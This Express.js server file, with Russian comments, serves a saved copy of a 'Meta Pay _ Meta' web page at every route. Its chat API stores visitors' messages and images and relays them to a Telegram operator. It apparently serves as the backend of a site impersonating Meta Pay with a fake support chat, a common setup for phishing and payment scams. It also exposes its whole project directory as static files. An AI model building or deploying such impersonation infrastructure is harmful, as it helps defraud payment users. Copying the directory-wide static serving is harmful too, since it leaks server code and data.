const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const multer = require('multer');
const { initDatabase, saveMessage, getMessages } = require('./database');
const TelegramSupportBot = require('./telegramBot');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Настройка multer для загрузки изображений
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 5 * 1024 * 1024 } // 5MB
});

// Раздаем статические файлы из корневой директории
app.use(express.static(__dirname));

// Раздаем файлы из папки Meta Pay _ Meta_files
app.use('/Meta Pay _ Meta_files', express.static(path.join(__dirname, 'Meta Pay _ Meta_files')));

// Инициализация базы данных и Telegram бота
let db;
let telegramBot;

(async () => {
    try {
        console.log('🔄 Инициализация базы данных...');
        db = await initDatabase();
        
        if (!db) {
            console.error('❌ Ошибка: база данных не инициализирована');
            return;
        }
        
        console.log('✅ База данных инициализирована');
        
        // Инициализируем Telegram бота
        const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
        const operatorChatId = process.env.TELEGRAM_OPERATOR_CHAT_ID;
        
        if (telegramToken && operatorChatId) {
            telegramBot = new TelegramSupportBot(telegramToken, operatorChatId, db);
            console.log('✅ Telegram бот запущен');
        } else {
            console.warn('⚠️ Telegram бот не настроен (TELEGRAM_BOT_TOKEN или TELEGRAM_OPERATOR_CHAT_ID не установлены)');
        }
    } catch (error) {
        console.error('❌ Ошибка инициализации:', error);
        db = null;
    }
})();

// API: Отправка текстового сообщения
app.post('/api/support/sendMessage', async (req, res) => {
    try {
        if (!db) {
            return res.status(503).json({ error: 'База данных не инициализирована' });
        }
        
        const { supportToken, message } = req.body;
        
        if (!supportToken || !message) {
            return res.status(400).json({ error: 'supportToken и message обязательны' });
        }

        // Сохраняем сообщение в БД (messageFrom = 1 для клиента)
        const savedMessage = await saveMessage(db, supportToken, message, null, 1);
        
        // Отправляем оператору в Telegram
        if (telegramBot) {
            await telegramBot.sendToOperator(supportToken, message);
        }

        res.json({ success: true, messageId: savedMessage.id });
    } catch (error) {
        console.error('❌ Ошибка отправки сообщения:', error);
        res.status(500).json({ error: 'Ошибка отправки сообщения' });
    }
});

// API: Отправка изображения
app.post('/api/support/sendImage', upload.single('image'), async (req, res) => {
    try {
        if (!db) {
            return res.status(503).json({ error: 'База данных не инициализирована' });
        }
        
        const { supportToken } = req.body;
        const file = req.file;

        if (!supportToken || !file) {
            return res.status(400).json({ error: 'supportToken и image обязательны' });
        }

        // Конвертируем изображение в base64 для хранения
        const imageBase64 = `data:${file.mimetype};base64,${file.buffer.toString('base64')}`;
        
        // Сохраняем сообщение с изображением в БД (messageFrom = 1 для клиента)
        await saveMessage(db, supportToken, null, imageBase64, 1);
        
        // Отправляем оператору в Telegram
        if (telegramBot) {
            await telegramBot.sendToOperator(supportToken, '[Изображение]', file.buffer);
        }

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Ошибка отправки изображения:', error);
        res.status(500).json({ error: 'Ошибка отправки изображения' });
    }
});

// API: Получение всех сообщений
app.post('/api/support/getMessages1', async (req, res) => {
    try {
        if (!db) {
            return res.status(503).json({ error: 'База данных не инициализирована' });
        }
        
        const { supportToken } = req.body;
        
        if (!supportToken) {
            return res.status(400).json({ error: 'supportToken обязателен' });
        }

        // Получаем все сообщения из БД
        const messages = await getMessages(db, supportToken);
        
        // Форматируем сообщения для клиента
        const formattedMessages = messages.map(m => ({
            id: m.id,
            message: m.message,
            image: m.image,
            messageFrom: m.messageFrom === 0 || m.messageFrom === 1 ? m.messageFrom : 1,
            createdAt: m.createdAt
        }));
        
        res.json({ 
            success: true, 
            messages: formattedMessages
        });
    } catch (error) {
        console.error('❌ Ошибка получения сообщений:', error);
        res.status(500).json({ error: 'Ошибка получения сообщений' });
    }
});

// Обработка корневого маршрута - отдаем главный HTML файл
app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'Meta Pay _ Meta.html');
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('Файл не найден: Meta Pay _ Meta.html');
    }
});

// Обработка всех остальных маршрутов
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'Meta Pay _ Meta.html'));
});

app.listen(PORT, () => {
    console.log(`✅ Сервер запущен на http://localhost:${PORT}`);
});
